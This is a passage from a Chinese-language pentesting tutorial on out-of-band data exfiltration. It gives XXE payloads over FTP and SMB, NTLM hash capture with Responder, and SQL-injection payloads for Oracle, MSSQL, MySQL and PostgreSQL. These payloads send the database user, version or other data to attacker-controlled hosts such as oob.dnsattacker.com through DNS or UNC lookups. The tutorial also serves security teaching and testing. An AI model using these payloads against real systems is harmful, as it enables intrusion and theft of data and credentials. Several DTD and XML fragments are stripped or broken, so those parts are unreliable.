    ">
注意：对于受害主机是Windows系统的，请使用下面这个dtd文件：  
windwos.dtd
    ">
**FTP**  
攻击者：运行python
HTTP服务器存放dtd文件并运行xxeftp服务器(请参考[这里](https://gist.github.com/staaldraad/280f167f5cb49a80b4a3
"这里"))
    python -m SimpleHttpServer 9000
    python xxeftp.py
受害主机
    %sp;
    %param1;
    ]>
    &exfil;
linux.dtd文件内容如下：
    ">
注意：Windows受害主机请使用下面的dtd文件  
windows.dtd
    ">
SMB(窃取哈希)  
攻击者：运行responder来获取哈希
    sudo ./Responder.py -I eth0
受害主机：
    ]>
    &xxe;
注意：出于演示目的，我们将使用CVE2018-0878:Windows远程协助XXE漏洞。  
同样，你可以使用其他的payload来提取数据
    http://oob.dnsattacker.com:port/%data
    ftp://oob.dnsattacker.com:port/%data
    gopher://oob.dnsattacker.com:port/%data%
    ldap://oob.dnsattacker.com:port
    \\oob.dnsattacker.com\\C$\\1.txt
**SQL注入**  
注意：所有数据库服务器都安装在Windows主机上。有关SQL注入备忘录请点击[这里](http://pentestmonkey.net/category/cheat-sheet/sql-injection "这里")和[这里](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ "这里")。
**检测**  
DNS  
攻击者：使用wireshark/tcpdump指定53端口来观察响应。
    sudo tcpdump -n port 53
**Oracle**  
检测  
受害主机
    SELECT DBMS_LDAP.INIT((‘oob.dnsattacker.com',80) FROM DUAL;
注意：使用这个技术，需要更高的权限来调用上述的函数。
漏洞利用和提取数据  
受害主机：
    SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.com',80) FROM dual;    /* Extracting Oracle database version */
我们也可以使用下面这个payload
    SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual;      /*Extracting Current user in Oracle database */
如果你使用的Oracle数据库版本是10G，甚至是更低的版本，你可以使用这下面几个替代方法来发起DNS请求：
    UTL_INADDR.GET_HOST_ADDRESS, 
    UTL_HTTP.REQUEST,
    HTTP_URITYPE.GETCLOB, 
    DBMS_LDAP.INIT and UTL_TCP
**MSSQL**  
检测  
受害主机
    EXEC master..xp_dirtree '\\oob.dnsattacker.com \' –
漏洞利用和数据提取  
受害主机
    DECLARE @data varchar(1024);
    SELECT @data = (SELECT system_user);  
    EXEC('master..xp_dirtree "\\'+@data+'.oob.dnsattacker.com\foo$"');
限制条件：如果要利用这个技术，数据库需要是sysadmin权限
其他发起DNS请求的方法有：xp_fileexists, xp_subdirs, xp_getfiledetails, sp_add_jobstep
**MYSQL**  
检测  
受害主机
    SELECT LOAD_FILE(CONCAT('\\\\', 'oob.dnsattacker.com\\test.txt'));
漏洞利用和数据提取  
受害主机
    SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(CONCAT(user(),"\n"))), '.oob.dnsattacker.com\\test.txt'));
限制条件：要使用这个技术，数据库需要有select update和file权限。  
**Postgresql**  
检测  
受害主机
    CREATE EXTENSION dblink;SELECT dblink_connect('host=oob.dnsattacker.com user=postgres password=password dbname=dvdrental');
限制条件：用户必须要有superuser权限来执行CREATE EXTENSION查询。
漏洞利用和数据提取  
受害主机
    DROP TABLE IF EXISTS table_output;
    CREATE TABLE table_output(content text);
    CREATE OR REPLACE FUNCTION temp_function()
    RETURNS VOID AS $$
    DECLARE exec_cmd TEXT;
    DECLARE query_result TEXT;
    BEGIN
        SELECT INTO query_result (SELECT encode(convert_to(concat(user,'     '), 'UTF8'),'hex'));
        exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.oob.dnsattacker.com\\\\foobar.txt\'';
        EXECUTE exec_cmd;
    END;
    $$ LANGUAGE plpgsql SECURITY DEFINER;
    SELECT temp_function();
限制条件：用户必须要有superuser权限来执行这个命令
**使用DNS进行数据提取的限制**  
域名最多只能包含127个子域。  
每个子域最多只能包含63个字符  
完整域名的最大长度为253个字符  
由于DNS记录缓存，会为每个请求的URL添加一个唯一值  
DNS是明文通道，任何通过DNS提取的数据都是明文形式，可被中间节点和DNS服务器缓存使用，因此不建议使用DNS通道来提取敏感数据。
参考  